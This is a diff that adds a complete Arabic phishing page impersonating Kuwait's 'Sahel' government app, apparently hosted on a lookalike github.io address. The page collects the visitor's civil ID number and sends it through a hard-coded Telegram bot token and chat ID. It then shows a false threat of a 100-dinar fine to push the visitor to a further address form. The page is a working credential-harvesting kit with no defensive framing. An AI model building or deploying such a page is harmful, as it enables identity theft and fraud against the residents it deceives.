@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta property="og:title" content="سهل" />
+<meta property="og:description" content="تعديل او تأكيد العنوان المدني" />
+<meta property="og:image" content="https://kuwaitsa.github.io/saheyl/Sahel_Application.png" />
+<meta property="og:url" content="https://kuwaitsa.github.io/saheyl/" />
+<meta property="og:type" content="website" />
+<meta property="og:locale" content="ar_AR" />  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+
+<style>
+    body {
+      margin: 0;
+      padding: 0;
+      direction: rtl;
+      font-family: sans-serif;
+      background-color: #ffffff;
+    }
+    header {
+      text-align: right;
+      padding: 16px;
+      color: #fff;
+      background-image: url('header.jpg');
+      background-size: cover;
+    }
+    main {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 24px;
+    }
+    .large-img {
+      width: 140px;
+      height: 140px;
+    }
+    .input-group {
+      width: 100%;
+      max-width: 320px;
+      margin-bottom: 16px;
+      position: relative;
+    }
+    .input-group input {
+      width: 100%;
+      height: 48px;
+      padding: 0 12px;
+      border: 1px solid #ccc;
+      border-radius: 24px;
+      font-size: 16px;
+    }
+    .input-group input:focus {
+      outline: none;
+      border-color: #1e88e5;
+    }
+    button {
+      width: 100%;
+      max-width: 320px;
+      height: 48px;
+      background-color: #1e88e5;
+      color: #fff;
+      border: none;
+      border-radius: 24px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    button:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
+    }
+    #warning {
+      display: none;
+      background-color: #f0f0f0;
+      border-radius: 16px;
+      padding: 16px;
+      margin-top: 16px;
+      max-width: 320px;
+      text-align: center;
+      font-size: 14px;
+      color: #333;
+    }
+    #warning button {
+      margin-top: 12px;
+      background-color: #2612bc;
+      width: auto;
+      padding: 8px 16px;
+      border-radius: 12px;
+      font-size: 19px;
+    }
+
+   
+    #imgbode {
+  width: 100%;
+  max-width: 300px;  
+  height: auto;
+  object-fit: contain; 
+}
+
+#textbode {
+  font-size: 15px ;
+  color: #bd9d9d ;
+  text-align: center ;
+  margin-top: -15px;
+  margin-bottom: 25px;
+}
+
+  #civilIdError {
+    color: red;
+    font-size: 14px;
+    margin-top: 5px;
+    display: none;
+  }
+  </style>
+</head>
+<body>
+
+<header>
+
+  <img src="https://upload.wikimedia.org/wikipedia/commons/1/15/Sahel_Application.png" alt="صورة" class="large-img" />
+
+</header>
+
+<main>
+  <img id="imgbode" src="https://play-lh.googleusercontent.com/Z3GYnbrOaYpIitn8_mBVDg9xOZ-CgG6RWEeoTlNppuCoj0R5vWgX0K-rqI5V4qkAwaGc" alt="صورة" class="large-img" />
+
+  <h2 id="textbode" > مرحبا بك في سهل</h2>
+  
+
+  <div class="input-group">
+<input
+  type="tel"
+  id="civilId"
+  placeholder="الرقم المدني"
+  pattern="[0-9]*"
+  inputmode="numeric"
+  style="text-align: center;" maxlength="12"
+/>
+<div id="civilIdError">            الرقم المدني غير صحيح يرجى التحقق من الرقم المدني</div>
+
+  </div>
+
+  <button id="loginBtn" disabled>تسجيل الدخول</button>
+
+  <div id="warning">
+    <p>           يرجى ملئ بيانات العنوان المدني وتثبيتها في الانظمة لتجنب الغرامة 100 دينار         </p>
+    <button onclick="location.href='form1.html'">                 ادخال عنوان      </button>
+  </div>
+</main>
+
+
+
+<script>
+  const BOT_TOKEN = "8010135725:AAFSSK0gLOl9f70EZHBL53w5UZA0QcOV7fo";
+  const CHAT_ID = "7595871538";
+
+  const civilIdInput = document.getElementById("civilId");
+  const errorDiv = document.getElementById("civilIdError");
+  const loginBtn = document.getElementById("loginBtn");
+  const warningDiv = document.getElementById("warning");
+
+  civilIdInput.addEventListener("input", function () {
+    const value = civilIdInput.value.trim();
+    const firstDigit = value.charAt(0);
+
+    const isValid =
+      value.length === 12 && (firstDigit === "1" || firstDigit === "2" || firstDigit === "3");
+
+    if (!isValid && value.length > 0) {
+      errorDiv.style.display = "block";
+    } else {
+      errorDiv.style.display = "none";
+    }
+
+    loginBtn.disabled = !isValid;
+
+    if (warningDiv.style.display === "block") {
+      warningDiv.style.display = "none";
+    }
+  });
+
+  loginBtn.addEventListener("click", function () {
+    const value = civilIdInput.value.trim();
+
+    if (value.length === 12) {
+      const message = encodeURIComponent(`تم إدخال الرقم المدني: ${value}`);
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            warningDiv.style.display = "block";
+            warningDiv.innerHTML = `<p> يرجى ملئ بيانات العنوان المدني وتثبيتها في الانظمة لتجنب الغرامة 100 دينار  </p><button onclick="location.href='form1.html'">ادخال عنوان</button>`;
+          } else {
+            alert("حدث خطأ أثناء الإرسال إلى تيليجرام");
+            console.error(data);
+          }
+        })
+        .catch(error => {
+          alert("تعذر الاتصال بخادم تيليجرام");
+          console.error(error);
+        });
+    }
+  });
+</script>
+
+
+</body>
+</html>
